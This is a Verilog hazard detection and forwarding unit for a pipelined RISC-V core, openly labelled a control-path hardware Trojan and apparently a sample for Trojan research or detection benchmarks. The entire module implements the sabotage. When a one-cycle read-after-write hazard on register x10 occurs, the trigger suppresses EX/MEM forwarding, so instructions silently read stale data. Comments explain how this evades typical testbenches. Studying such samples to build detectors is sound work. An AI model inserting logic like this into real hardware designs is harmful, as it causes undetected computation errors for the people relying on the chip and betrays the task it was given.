// hazard_trojan_ctrl.v  --  Control-Path Trojan Variant
// Trojan definition:
//   Trigger  : EX/MEM destination register == x10 (a0, a common return-value
//              register) AND forwarding from EX/MEM would normally activate
//              for rs1.
//   Payload  : Suppress the EX/MEM forwarding for rs1 entirely (output 2'b00).
//              The instruction in EX reads a STALE register-file value instead
//              of the freshly computed result -- a silent data hazard.
//
// Why this is stealthy:
//   - The hazard detection logic is functionally correct for all other registers.
//   - Standard functional tests rarely stress a0 in a precise 1-cycle RAW
//     hazard pattern, so the corruption goes undetected by typical testbenches.
//   - The MEM/WB forwarding path still works, so a 2-cycle hazard on a0 is
//     handled correctly; only the 1-cycle case is corrupted.

module hazard_detection_unit (
    // ID stage
    input  [4:0] id_rs1,
    input  [4:0] id_rs2,

    // EX stage
    input  [4:0] ex_rs1,
    input  [4:0] ex_rs2,

    // ID/EX stage
    input  [4:0] idex_rd,
    input        idex_memRead,

    // EX/MEM stage
    input  [4:0] exmem_rd,
    input        exmem_regWrite,
    input        exmem_memRead,

    // MEM/WB stage
    input  [4:0] memwb_rd,
    input        memwb_regWrite,

    // Outputs
    output reg [1:0] forward_rs1,
    output reg [1:0] forward_rs2,
    output reg       stall
);

    // Normal can-forward condition (no load-to-use forwarding from EX/MEM)
    wire exmem_can_forward = exmem_regWrite && (~exmem_memRead);

    // Trojan trigger 
    // Fires when EX/MEM destination is x10 (a0) and would normally forward rs1
    wire trojan_trigger = exmem_can_forward
                          && (exmem_rd == 5'd10)        // destination is a0
                          && (exmem_rd == ex_rs1)       // rs1 needs that value
                          && (exmem_rd != 5'b0);        // not x0

    always @(*) begin
        forward_rs1 = 2'b00;
        forward_rs2 = 2'b00;
        stall       = 1'b0;

        // rs1 forwarding (Trojan suppresses EX/MEM path for x10) 
        if (!trojan_trigger && exmem_can_forward
                && (exmem_rd == ex_rs1) && (exmem_rd != 5'b0)) begin
            forward_rs1 = 2'b01;   // forward from EX/MEM  (normal)
        end
        else if (memwb_regWrite
                && (memwb_rd == ex_rs1) && (memwb_rd != 5'b0)) begin
            forward_rs1 = 2'b10;   // forward from MEM/WB
            // NOTE: when Trojan fires, this path picks up 2-cycle-old data,
            // which is WRONG for a 1-cycle RAW hazard -- silent corruption.
        end

        // rs2 forwarding (clean, Trojan does not touch rs2)
        if (exmem_can_forward
                && (exmem_rd == ex_rs2) && (exmem_rd != 5'b0)) begin
            forward_rs2 = 2'b01;
        end
        else if (memwb_regWrite
                && (memwb_rd == ex_rs2) && (memwb_rd != 5'b0)) begin
            forward_rs2 = 2'b10;
        end

        // Load-use stall (identical to clean) 
        if (idex_memRead &&
               ((id_rs1 == idex_rd && idex_rd != 5'b0) ||
                (id_rs2 == idex_rd && idex_rd != 5'b0))) begin
            stall       = 1'b1;
            forward_rs1 = 2'b00;
            forward_rs2 = 2'b00;
        end
    end

endmodule